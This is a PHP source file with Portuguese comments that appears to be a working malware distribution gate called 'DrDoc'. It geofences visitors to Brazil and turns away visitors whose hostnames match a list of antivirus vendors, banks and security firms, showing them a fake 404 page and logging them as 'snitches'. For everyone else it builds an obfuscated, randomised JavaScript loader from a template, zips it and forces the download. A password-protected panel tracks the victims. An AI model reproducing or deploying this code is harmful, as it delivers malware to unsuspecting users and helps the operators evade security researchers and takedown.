<?php
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

////////// Instale o PDO e o Driver sqlite
////////// sudo apt-get install php5-sqlite
////////// sudo service apache2 restart
////////// 
////////// Ativar .htaccess Ubuntu Apache 2.2
////////// Você precisa habilitar o mod_rewrite (pode ser que ele já esteja habilitado, mas é bom verificar)
////////// sudo a2enmod rewrite
////////// Edite o arquivo /etc/apache2/sites-available/default e troque a linha
////////// AllowOverride None
////////// Por:
////////// AllowOverride All 
////////// 
////////// Ativar .htaccess Ubuntu Apache 2.4
////////// Você precisa habilitar o mod_rewrite (pode ser que ele já esteja habilitado, mas é bom verificar)
////////// sudo a2enmod rewrite
////////// Edite o arquivo /etc/apache2/sites-available/000-default.conf 
////////// e procure pela linha DocumentRoot /var/www/html.
////////// Adicione a regra para o diretório:
////////// <Directory "/var/www/html">
//////////     AllowOverride All
////////// </Directory>
////////// Não se esqueça de restartar o apache após aplicar as configurações:
////////// sudo service apache2 restart

if (gettype(@$_SERVER["HTTP_CF_IPCOUNTRY"]) == 'string'){ $_SERVER['REMOTE_ADDR'] = @$_SERVER["HTTP_CF_CONNECTING_IP"]; }
if (!extension_loaded('pdo_sqlite')) { echo 'Erro: Aus&ecirc;ncia da extens&atilde;o <b>pdo_sqlite</b>'; exit; }
$r = preg_replace("/[^@.a-zA-Z0-9-_]/", "", @$_REQUEST['nome']);

$pass 	= "supremo2017";	// SENHA ACESSO CONTADOR
$matrix = "load.js";		// LOAD MATRIX
	
function CurlGET($URL) {
	$chh = curl_init();
	curl_setopt( $chh, CURLOPT_URL, $URL );
	curl_setopt( $chh, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt( $chh, CURLOPT_TIMEOUT, 10);
	curl_setopt( $chh, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt( $chh, CURLOPT_RETURNTRANSFER,1);
	return curl_exec( $chh );
	curl_close($chh);
}
function ProcPalavras($frase, $palavras) {
	$resultado = 0;
	$encontrado = false;
	foreach ( $palavras as $key => $value ) { 
		$pos = @strpos($frase, $value); 
		if ($pos !== false) { 
			$resultado = 1; 
			$encontrado = $value;
			break;
		}
	} 
	return array($resultado, $encontrado);
}
function acento_para_html($umarray){
	$comacento = array('Á','á','Â','â','À','à','Ã','ã','É','é','Ê','ê','È','è','Ó','ó','Ô','ô','Ò','ò','Õ','õ','Í','í','Î','î','Ì','ì','Ú','ú','Û','û','Ù','ù','Ç','ç',);
	$acentohtml   = array('&Aacute;','&aacute;','&Acirc;','&acirc;','&Agrave;','&agrave;','&Atilde;','&atilde;','&Eacute;','&eacute;','&Ecirc;','&ecirc;','&Egrave;','&egrave;','&Oacute;','&oacute;','&Ocirc;','&ocirc;','&Ograve;','&ograve;','&Otilde;','&otilde;','&Iacute;','&iacute;','&Icirc;','&icirc;','&Igrave;','&igrave;','&Uacute;','&uacute;','&Ucirc;','&ucirc;','&Ugrave;','&ugrave;','&Ccedil;','&ccedil;');
	$umarray  = str_replace($comacento, $acentohtml, $umarray);
	return $umarray;
}
function GeoPlugin($Ip) {
	$geo = curl_init();
	curl_setopt( $geo, CURLOPT_URL, "http://www.geoplugin.net/php.gp?ip=$Ip" );
	curl_setopt( $geo, CURLOPT_CONNECTTIMEOUT, 6);
	curl_setopt( $geo, CURLOPT_TIMEOUT, 6);
	curl_setopt( $geo, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt( $geo, CURLOPT_RETURNTRANSFER,1);
	$GeoPlugin = unserialize(curl_exec( $geo ));
	$Pais = $GeoPlugin["geoplugin_countryCode"];
	
	if ($Pais == '') { 
		curl_setopt( $geo, CURLOPT_URL, "http://www.geoplugin.net/php.gp?ip=$Ip"); 
		$GeoPlugin = unserialize(curl_exec( $geo )); 
		$Pais = $GeoPlugin["geoplugin_countryCode"]; 
	}	
	$Cidade = $GeoPlugin["geoplugin_city"];
	$Estado = $GeoPlugin["geoplugin_regionName"];	
	
    if (strlen($Pais) < 2) { 
    $details = json_decode(file_get_contents("http://ipinfo.io/$Ip/json"));
	$Pais = $details->country;
	$Cidade = $details->city;
	$Estado = $details->region;
    }

	if (strlen($Pais) < 2) { 
	$locas = json_decode(file_get_contents("http://freegeoip.net/json/$Ip"));
	$Pais = $locas->country_code;
	$Cidade = $locas->city;
	$Estado = $locas->region_name;
	}

	if ($Pais == "Brazil") { 
	$Pais = "BR";
	}
	
	if ($Pais == "Brasil") { 
	$Pais = "BR";
	}
   
	if ($Pais == "") { 
	$Pais = "BR";
	$Estado = "INFERNO";
	}
  
	if (strlen($Pais) < 2) { 
	$Pais = "BR";
	$Estado = "INFERNO";
	}		

	return array($Pais, $Estado, $Cidade);
	curl_close( $geo );
}
function X9($Ip, $Local, $Mensagem, $PDO, $Cliente_Reverso) {
	$x9_ip = base64_encode($Ip);
	$x9_reverso = base64_encode($Cliente_Reverso);
	$x9_hora = base64_encode(date('d/m/Y H:i:s'));
	$x9_local = base64_encode($Local);
	$x9_mensagem = base64_encode($Mensagem);
	$ch = curl_init();
	$PDO->exec("INSERT INTO x9 (x9_ip, x9_reverso, x9_local, x9_hora, x9_mensagem) VALUES ('$x9_ip', '$x9_reverso', '$x9_local', '$x9_hora', '$x9_mensagem')");
	echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
	<html><head>
	<title>404 Not Found</title>
	</head><body>
	<h1>Not Found</h1>
	<p>The requested URL was not found on this server.</p>
	<p>Additionally, a 404 Not Found
	error was encountered while trying to use an ErrorDocument to handle the request.</p>
	<hr>
	<address>Apache/2.2.27 (Unix) mod_ssl/2.2.27 OpenSSL/0.9.8e-fips-rhel5 mod_bwlimited/1.4 Port 80</address>
	</body></html>';
	header("Location: https://www.google.com");
	exit;
}
function Contador($PDO,$NomeLoad, $Local, $IP, $REVERSO, $Cliente_Ref) {
	$up = false;
	$Ip = base64_encode($IP);
	$Hora = base64_encode(date('d/m/Y H:i:s'));
	$NomeLoad = base64_encode($NomeLoad);
	$Local = base64_encode($Local);
	$REVERSO = base64_encode($REVERSO);
	$Cliente_Ref = base64_encode($Cliente_Ref);
	$Query = $PDO->query("SELECT * FROM downloads WHERE ip LIKE '$Ip'");
	foreach($Query as $row) { 
		$id = $row['id'];
		$valor = $row['valor']+1;
		$PDO->exec("UPDATE downloads SET nomeload='$NomeLoad', valor=$valor WHERE (id=$id)");
		$up = true;
		break;
	}
	if ($up == false) {
		$PDO->exec("INSERT INTO downloads (ip, local, nomeload, hora, ref, valor, reverso) VALUES ('$Ip', '$Local', '$NomeLoad', '$Hora', '$Cliente_Ref', 1, '$REVERSO')");
	}
}
function randStringCons($size){
	$basic = 'BCDFGHJKLMNPQRSTVWXYZ'; $return= ""; for($count= 0; $size > $count; $count++){ $return.= $basic[rand(0, strlen($basic) - 1)]; } return $return;
}
function randStringVog($size){
	$basic = 'AEIOU'; $return= ""; for($count= 0; $size > $count; $count++){ $return.= $basic[rand(0, strlen($basic) - 1)]; } return $return;
}
function nomeRandom($size){
	$return= "";
	for($count= 0; $size > $count; $count++){
		if($count % 2 == 0) {
			$return = $return . randStringVog(1);
		} else {
			$return = $return . randStringCons(1);
		}
	}
	return $return;
}
function numeroRandom($size){
	$return = "";
	$basic = '0123456789';
	for ($i = 1; $i <= $size; $i++) {
		$return = $return . $basic[rand(0,strlen($basic)-1)];
	}
	return $return;
}
function CryptW($s1, $id) {
	$i=null; $x=0; $x2=null; $x3=null; $x4=rand(0,25); $sx='';
	$result = chr($x4+65);
	$x4 = $x4 + $id;
	for ($i = 0; $i <= strlen($s1)-1; $i++) {
		$x = ord(@$s1[$i]) + @$x4;
		if ($x <= 25) {
			$sx = 'A' . chr($x+65);
		} else {
			$x2 = floor( $x / 25 );
			$x3 = $x - ($x2 * 25);
			$sx = chr($x2+65) . chr($x3+65);
		}
		$result = $result . $sx;
	}
	return $result;
}
function PegarDelimitador($INICIO, $FIM, $TEXTO) {
	$TEXTO = explode($INICIO, $TEXTO);
	$TEXTO = explode($FIM, $TEXTO[1]);
	return $TEXTO[0];		
}
function str_replace_once($search, $replace, $subject) {
	if(($pos = strpos($subject, $search)) !== false) {
		$ret = substr($subject, 0, $pos).$replace.substr($subject, $pos + strlen($search));
	} else {
		$ret = $subject;
	}
	return($ret);
}

if (@$_GET['pass'] != $pass) {	// COMPARAÇÃO SE A SENHA ESTÁ CORRETA, SE NÃO ESTÁ INSERE CONTADOR E FORÇA DOWNLOAD, SE ESTÁ CORRETA PULA PARA EXECUTAR VER O CONTADOR.
	if (@$_REQUEST['nome'] != 'asd') {
		/**************** COMEÇA CHECAR E INSERIR CONTADOR DOWNLOAD ****************/
		$PDO = new PDO("sqlite:db.sqlite");
		$PDO->exec("CREATE TABLE downloads (id INTEGER PRIMARY KEY, ip VARCHAR, local VARCHAR, nomeload VARCHAR, hora VARCHAR, ref VARCHAR, valor INTEGER, reverso VARCHAR)");
		$PDO->exec("CREATE TABLE x9 (id INTEGER PRIMARY KEY, x9_ip VARCHAR, x9_reverso VARCHAR, x9_local VARCHAR, x9_hora VARCHAR, x9_mensagem VARCHAR)");	
		$ListaBanidos = array("scotiabank","letti.","unisys","antivirus1.unisys","antivirus","abuse@","spam@", ".sysms.net", "easysol.net", "diebold", "cisco.com", "antivirus2.unisys","hawking.unisys","ragingwire.net", "isitphishing.org", "barracuda","netcraft", "ebay.", "panda.","microsoft.","fbi.", "google.", "resuelveserver", "bankofamerica", "mozilla.", "viabcp.", "veritas.","nod32.","antipishing.","kapersky.", "norton.", "symantec.","rsasecurity.", "bancopopular.", "paypal.", "unicaja.", "movistar.", "banesto", "cajamadrid", "bancopastor", "rsa.", "symantecstore.", "gfihispana.", "fraudwatchinternational.", "verisign.", "markmonitor.", "anti-phishing.", "pandasoftware.", "delitosinformaticos.", "zonealarm", "alerta-antivirus", "vsantivirus", "nortonsecurityscan", "hauri-la", "cleandir", "trendmicro", "mcafee", "nod32-es", "pandaantivirus", "free-av", "grisoft", "bitdefender-", "sophos", "activescan", "avast", "bitdefender", "trendmicro-europe", "clamav", "clamwin", "eset.", "symantecstore", "f-secure", "hispasec", "vnunet", "seguridad", "security", "monitor.", "detector.", "opera.", "fraud.");

$cookipais = "pais";
$cookiestado = "estado";
$cookicidade = "cidade";

$Cliente_Ref = @$_SERVER['HTTP_REFERER'];
$Cliente_Ip = $_SERVER['REMOTE_ADDR'];
$Cliente_Reverso = gethostbyaddr($Cliente_Ip);

if(!isset($_COOKIE[$cookipais])) {
		$Cliente_Local = GeoPlugin($Cliente_Ip);
		$Cliente_Pais = $Cliente_Local[0];
		$Cliente_Estado = $Cliente_Local[1];
		$Cliente_Cidade = $Cliente_Local[2];		
		

	setcookie($cookipais, $Cliente_Pais, time() + (3600*24*30*12*5), "/"); // 86400 = 1 day
	setcookie($cookiestado, $Cliente_Estado, time() + (3600*24*30*12*5), "/"); // 86400 = 1 day
	setcookie($cookicidade, $Cliente_Cidade, time() + (3600*24*30*12*5), "/"); // 86400 = 1 day
$EnviarLocal = "$Cliente_Pais - $Cliente_Estado - $Cliente_Cidade";	
} else {
  $Cliente_Pais = $_COOKIE[$cookipais];
  $Cliente_Estado = $_COOKIE[$cookiestado];
  $Cliente_Cidade = $_COOKIE[$cookicidade];
  $EnviarLocal = "$Cliente_Pais - $Cliente_Estado - $Cliente_Cidade CK";	
}    

		
		/*///////////////////////////////////////////////////////////////////*/
		$Verificar_Cliente_Reverso = ProcPalavras($Cliente_Reverso, $ListaBanidos);		
		/*///////////////////////////////////////////////////////////////////*/
		if (gettype(@$_SERVER["HTTP_CF_IPCOUNTRY"]) == 'string') { 
			if ($_SERVER["HTTP_CF_IPCOUNTRY"] != 'BR') { 
				$X9MSG = 'IP De Fora Bloqueado! CF!';
				X9($Cliente_Ip, "$EnviarLocal $r", $X9MSG, $PDO, $Cliente_Reverso);
				exit;
			}
		} else {
				  if ((strpos($r, ".br" ) > 0)) {
                  $Cliente_Pais = "BR";    
                   } 
		     if ($Cliente_Pais != 'BR') { 
				$X9MSG = 'IP De Fora Bloqueado! GP!';

				X9($Cliente_Ip, "$EnviarLocal  --- $r", $X9MSG, $PDO, $Cliente_Reverso);
				exit;
			}
		}
		
	    /*///////////////////////////////////////////////////////////////////*/
		if ($Verificar_Cliente_Reverso[0] >= '1') {
			$X9MSG = 'Reverso Brasileiro Bloqueado! '.$Verificar_Cliente_Reverso[1].'!';
			X9($Cliente_Ip, "$EnviarLocal --- $r", $X9MSG, $PDO, $Cliente_Reverso);
			exit;
		}
		
		$Verificar_Cliente_Reverso = ProcPalavras($r, $ListaBanidos);
		if ($Verificar_Cliente_Reverso[0] >= '1') {
			$X9MSG = 'Reverso Brasileiro Bloqueado! '.$Verificar_Cliente_Reverso[1].'!';
			X9($Cliente_Ip, "$EnviarLocal --- $r", $X9MSG, $PDO, $Cliente_Reverso);
			exit;
		}		
		
		Contador($PDO, $r, $EnviarLocal, $Cliente_Ip, $Cliente_Reverso, $Cliente_Ref);
		
		//$corpo = file_get_contents("01/Seu7.txt");
        //echo $corpo;
		header("Location: https://www.google.com");
	    exit;		
		/**************** TERMINA CHECAR E INSERIR CONTADOR DOWNLOAD ****************/
		
		/**************** COMEÇA GERAR LOAD, ZIPAR E FORÇAR DOWNLOAD ****************/
		$Load = file_get_contents($matrix);
		$chave1 = 'A' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave2 = 'B' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave3 = 'C' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave4 = 'D' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave5 = 'E' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave6 = 'F' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave7 = 'G' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave8 = 'H' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave9 = 'I' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave10 = 'J' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave11 = 'K' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave12 = 'L' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave13 = 'M' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave14 = 'N' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave15 = 'O' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave16 = 'P' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave17 = 'Q' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave18 = 'R' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave19 = 'S' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave20 = 'U' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave21 = 'V' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave22 = 'X' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave23 = 'Z' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave24 = 'Y' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave25 = 'W' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave26 = 'AA' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave27 = 'BB' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$chave28 = 'CC' . nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
		$Load = preg_replace("/(^[\r\n]*|[\r\n]+)[\s\t]*[\r\n]+/", "\n", $Load);
		
		$Load = str_replace("DOCHAVE1",nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$Load);
		$Load = str_replace("DOCHAVE2",nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$Load);
		$Load = str_replace("DOCHAVE3",nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$Load);
		$Load = str_replace("DOCHAVE4",nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$Load);
		$Load = str_replace("DOCHAVE5",nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$Load);
		$Load = str_replace("DOCHAVE6",nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$Load);
		$Load = str_replace("DOCHAVE7",nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$Load);
		$Load = str_replace("DOCHAVE8",nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$Load);	
		$Load = str_replace("DOCHAVE9",nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$Load);	
		$Load = str_replace("DOCHAVE10",nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$Load);	
		$Load = str_replace("DOCHAVE11",nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$Load);		
		$Load = str_replace("DOCVAL6",numeroRandom(8),$Load);
		$Load = str_replace("DOCVAL7",numeroRandom(10),$Load);
		$Load = str_replace("RD3INT",numeroRandom(preg_replace("/[^0-9]/", "", rand(4,8))),$Load);
		$Load = str_replace("DOCVAL8",numeroRandom(preg_replace("/[^0-9]/", "", rand(4,8))),$Load);
		$Load = str_replace("DOCVAL9",numeroRandom(preg_replace("/[^0-9]/", "", rand(4,8))),$Load);		
		$Load = str_replace("DOCVALX1",numeroRandom(4),$Load);
		$Load = str_replace("DOCVALXTOTAL",nomeRandom(preg_replace("/[^0-9]/", "", rand(10,12))),$Load);	
		$Load = str_replace("DOCVAL",nomeRandom(preg_replace("/[^0-9]/", "", rand(6,10))),$Load);
		$Load = str_replace("DOCRD1",nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$Load);
		$Load = str_replace("DOCRD2",nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$Load);			
		$Load = str_replace("DOCRD",nomeRandom(preg_replace("/[^0-9]/", "", rand(7,12))),$Load);			
		$Load = str_replace("CHAVEMESTRE1",nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$Load);
		$Load = str_replace("CHAVEMESTRE2",nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$Load);
		$Load = str_replace("CHAVEMESTRER1",nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$Load);
		$Load = str_replace("CHAVEMESTRER2",nomeRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$Load);		
		
		$Load = str_replace("CHAVE10",$chave10,$Load);
		$Load = str_replace("CHAVE11",$chave11,$Load);
		$Load = str_replace("CHAVE12",$chave12,$Load);
		$Load = str_replace("CHAVE13",$chave13,$Load);
		$Load = str_replace("CHAVE14",$chave14,$Load);
		$Load = str_replace("CHAVE15",$chave15,$Load);
		$Load = str_replace("CHAVE16",$chave16,$Load);
		$Load = str_replace("CHAVE17",$chave17,$Load);
		$Load = str_replace("CHAVE18",$chave18,$Load);
		$Load = str_replace("CHAVE19",$chave19,$Load);
		$Load = str_replace("CHAVE20",$chave20,$Load);
		$Load = str_replace("CHAVE21",$chave21,$Load);
		$Load = str_replace("CHAVE22",$chave22,$Load);
		$Load = str_replace("CHAVE23",$chave23,$Load);
		$Load = str_replace("CHAVE24",$chave24,$Load);
		$Load = str_replace("CHAVE25",$chave25,$Load);
		$Load = str_replace("CHAVE26",$chave26,$Load);
		$Load = str_replace("CHAVE27",$chave27,$Load);
		$Load = str_replace("CHAVE28",$chave28,$Load);
		$Load = str_replace("CHAVE1",$chave1,$Load);
		$Load = str_replace("CHAVE2",$chave2,$Load);
		$Load = str_replace("CHAVE3",$chave3,$Load);
		$Load = str_replace("CHAVE4",$chave4,$Load);
		$Load = str_replace("CHAVE5",$chave5,$Load);
		$Load = str_replace("CHAVE6",$chave6,$Load);
		$Load = str_replace("CHAVE7",$chave7,$Load);
		$Load = str_replace("CHAVE8",$chave8,$Load);
		$Load = str_replace("CHAVE9",$chave9,$Load);
		$Load = str_replace('\r','',$Load);		
		$Load = explode("\n", $Load);
		foreach ( $Load as $key => $value ) {
			$achar = 'xxpegapulakk(';
			if (strpos($Load[$key], $achar) == true) {
				$exp = explode($achar, $Load[$key]);
				$Linha = $exp[0];
				foreach ( $exp as $chave => $valor ) {
					if ($chave != 0) { 
						$Linha = $Linha . $achar;
						$s = PegarDelimitador('"','"',$exp[$chave]);	
						$Linha = $Linha . str_replace($s,CryptW($s, 10),$exp[$chave]);
									
					}
				}
				$Load[$key] = $Linha;
				$numerorandom3 = numeroRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
				$numerorandom = numeroRandom(preg_replace("/[^0-9]/", "", rand(6,15)));
				$nomeRandom = nomeRandom(preg_replace("/[^0-9]/", "", 9));
				$nomeRandomX = nomeRandom(preg_replace("/[^0-9]/", "", 7));			
				$Load[$key] = str_replace('RD4NUM','"'.$nomeRandom.'"',$Load[$key]);
				$Load[$key] = str_replace('RD5NUM','"'.$nomeRandomX.'"',$Load[$key]);	
				$Load[$key] = str_replace("RDNUMS",'"'.nomeRandom(preg_replace("/[^0-9]/", "", rand(20,30))).'"',$Load[$key]);			
				$Load[$key] = str_replace('RDNUM',$numerorandom,$Load[$key]);						
			}
		}
		$LoadSave = '';
		foreach ( $Load as $key => $value ) {
			$LoadSave = $LoadSave . $value . PHP_EOL;
		}		
		$LoadSave = str_replace("RD2NUM",numeroRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$LoadSave);
		$LoadSave = str_replace("RD3NUM",numeroRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$LoadSave);
		$LoadSave = str_replace("RD4NUM",numeroRandom(preg_replace("/[^0-9]/", "", rand(6,15))),$LoadSave);	
		$LoadSave = str_replace('RD3NUS',nomeRandom(preg_replace("/[^0-9]/", "", 9)),$LoadSave);
		$LoadSave = str_replace("RDNUMS",'"'.nomeRandom(preg_replace("/[^0-9]/", "", rand(20,30))).'"',$LoadSave);
		$LoadSave = str_replace("xxpegapulakk",$chave14.$chave7.$chave12.$chave18,$LoadSave);
		$LoadSave = str_replace("xxPegaPulakk",$chave14.$chave7.$chave12.$chave18,$LoadSave);
		$LoadSave = str_replace("xxPegapulakk",$chave14.$chave7.$chave12.$chave18,$LoadSave);
		$LoadSave = str_replace("RNOMEOK",$r,$LoadSave);
		
		$num = rand(00000000000,99999999999);
		$zip = new ZipArchive();
		if( $zip->open("$num.zip",ZipArchive::CREATE ) === true ) {
			$zip->addFromString("$num.js",$LoadSave);
			$zip->close();
		}
		header("Content-Type: application/zip");
		header("Content-Disposition: attachment; filename=$num.zip");
		header("Content-Length: " . filesize("$num.zip"));
		readfile("$num.zip");
		unlink("$num.zip");
		exit;
		/**************** TERMINA GERAR LOAD, ZIPAR E FORÇAR DOWNLOAD ****************/
	} else {
		/**************** COMEÇA EXIBE 404 CASO NAO RECEBA PARAMETRO ****************/
		echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
		<html><head>
		<title>404 Not Found</title>
		</head><body>
		<h1>Not Found</h1>
		<p>The requested URL was not found on this server.</p>
		<p>Additionally, a 404 Not Found
		error was encountered while trying to use an ErrorDocument to handle the request.</p>
		<hr>
		<address>Apache/2.2.27 (Unix) mod_ssl/2.2.27 OpenSSL/0.9.8e-fips-rhel5 mod_bwlimited/1.4 Port 80</address>
		</body></html>';
		exit;
		/**************** TERMINA EXIBE 404 CASO NAO RECEBA PARAMETRO ****************/
	}
} else {
	// EXECUTAR VER O CONTADOR
	
	/**************** COMEÇA ZERAR CONTADOR ****************/
	if (@$_REQUEST['zerar'] == 'true') {
		if (file_exists('db.sqlite')) {
			unlink('db.sqlite');
		}
		echo "<meta http-equiv='refresh' content='0;url=?pass=$pass'>";
		exit;
	}	
	/**************** TERMINA ZERAR CONTADOR ****************/
	
	/**************** COMEÇA EXIBIR CONTADOR ****************/
	$PDO = new PDO("sqlite:db.sqlite");
	$PDO->exec("CREATE TABLE downloads (id INTEGER PRIMARY KEY, ip VARCHAR, local VARCHAR, nomeload VARCHAR, hora VARCHAR, ref VARCHAR, valor INTEGER, reverso VARCHAR)");
	$PDO->exec("CREATE TABLE x9 (id INTEGER PRIMARY KEY, x9_ip VARCHAR, x9_reverso VARCHAR, x9_local VARCHAR, x9_hora VARCHAR, x9_mensagem VARCHAR)");	
	$Query = $PDO->query("SELECT * FROM x9 ORDER BY id DESC");
	$ListarX9 = '';
	$TotalX9 = 0;
	foreach($Query as $row) { 
		if ($TotalX9 < 100) {
			$ListarX9 .= '<tr style="text-align: center;border: 2px dotted #999;background-color: #F3F3F3;">
						<th height="13" scope="row">'.$row['id'].'</th>
						<td>'.base64_decode($row['x9_ip']).' ('.base64_decode($row['x9_reverso']).')</td>
						<td>'.base64_decode($row['x9_hora']).'</td>
						<td>'.base64_decode($row['x9_local']).'</td>
						<td>'.base64_decode($row['x9_mensagem']).'</td>
						</tr>';
		}
		$TotalX9++;
	}
	$Query = $PDO->query("SELECT * FROM downloads ORDER BY id DESC");
	$ListarDWN = '';
	$TotalXDWN = 0;	
	$TotalXDWNUnico = 0;		
	foreach($Query as $row) { 
		$TotalXDWNUnico = $TotalXDWNUnico + $row['valor'];
		if ($TotalXDWN < 100) {
			$ListarDWN .= '<tr style="text-align: center;border: 2px dotted #999;background-color: #F3F3F3;">
			<th height="13" scope="row">'.$row['id'].'</th>
			<td><input style="text-align:center;" type="text" value="'.base64_decode($row['ip']).'" disabled="disabled" size="20"> - <input style="text-align:center;" type="text" value="'.base64_decode($row['reverso']).'" disabled="disabled" size="45"></td>
			<td>'.base64_decode($row['hora']).'</td>
			<td>'.base64_decode($row['nomeload']).'.zip</td>
			<td>'.base64_decode($row['local']).'</td>
			<td>'.$row['valor'].'</td>
		</tr>';
		}
		$TotalXDWN++;
	}
	?>
	<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
	<title>DrDoc - Contador de Downloads e Caguetas X9</title>
    <META http-equiv="refresh" content="10;URL=?pass=<?php echo $pass; ?>">
	<style type="text/css">
	.Titulo {
		font-weight: bold;
		font-size: 26px;
	}
	.StyleTitulo {
		font-weight: bold;
		font-size: 22px;
	}
	
	.StyleDiv {
		background-color:#000000;
		text-align:center;
		width: 380px;
	}
	
	.style11 { font-weight: bold; color:#F00; }
	.style15 { font-weight: bold; color:#FF0; font-size: 20px; }
	a:link {
		color: #999;
		text-decoration: none;
	}
	a:visited {
		color: #999;
		text-decoration: none;
	}
	a:hover {
		color: #F00;
		text-decoration: underline;
	}
	a:active {
		color: #999;
		text-decoration: none;
	}
	</style>
    <script> function zerar($p) { if (confirm("Tem certeza que deseja zera?") == true) { window.location='?pass='+$p+'&zerar=true'; } } </script>
	</head>
	<body>
	<center>
	<div class="StyleDiv"><span class="style15">Contador de Downloads e X9 Caguetas<br>
	<span class="style11"> DrDoooc</span></span></div>
	<div id="DivMenu" name="DivMenu"><p>Total de Downloads Geral: <b><?php echo $TotalXDWNUnico; ?></b><br>Total de Downloads Unicos: <b><?php echo $TotalXDWN; ?></b><br>
	Total de X9 Caguetas: <b><?php echo $TotalX9; ?></b></p></div>
    <p><a onClick="zerar('<?php echo $pass; ?>');" style="cursor:pointer;">&gt;&gt;&gt;&gt; Zerar Contador &lt;&lt;&lt;&lt;</a></p>
	<span class="StyleTitulo">Ultimos 100 Downloads...</span>
	<div id="DivDownloads" name="DivDownloads"><table width="96%" style="border: 3px dotted #999;background-color: #ffffff;"><tbody><tr style="text-align: center;border: 2px dotted #999;background-color: #DDD;"><th width="4%" height="13" scope="col">ID</th><th width="37%" scope="col">Ip - Reverso</th><th width="18%" scope="col">Data/Hora</th><th width="18%" scope="col">NomeLoad</th><th width="20%" scope="col">Local</th><th width="6%" scope="col">Downloads</th></tr><tr style="text-align: center;border: 2px dotted #999;background-color: #F3F3F3;"><?php echo @$ListarDWN; ?></tr></tbody></table></div>
	<br><br>
	<span class="StyleTitulo">Ultimos 100 X9 Caguetas...</span>
	<div id="DivX9" name="DivX9"><table width="85%" style="border: 3px dotted #999;background-color: #ffffff;"><tbody><tr style="text-align: center;border: 2px dotted #999;background-color: #DDD;"><th width="4%" height="13" scope="col">ID</th><th width="32%" scope="col">Ip - Reverso</th><th width="14%" scope="col">Data/Hora</th><th width="25%" scope="col">Local</th><th width="22%" scope="col">Mensagem</th></tr> <?php echo @$ListarX9; ?> </tbody></table></div><br>
	</center></body></html>
    <?php
	/**************** TERMINA EXIBIR CONTADOR ****************/
}
?>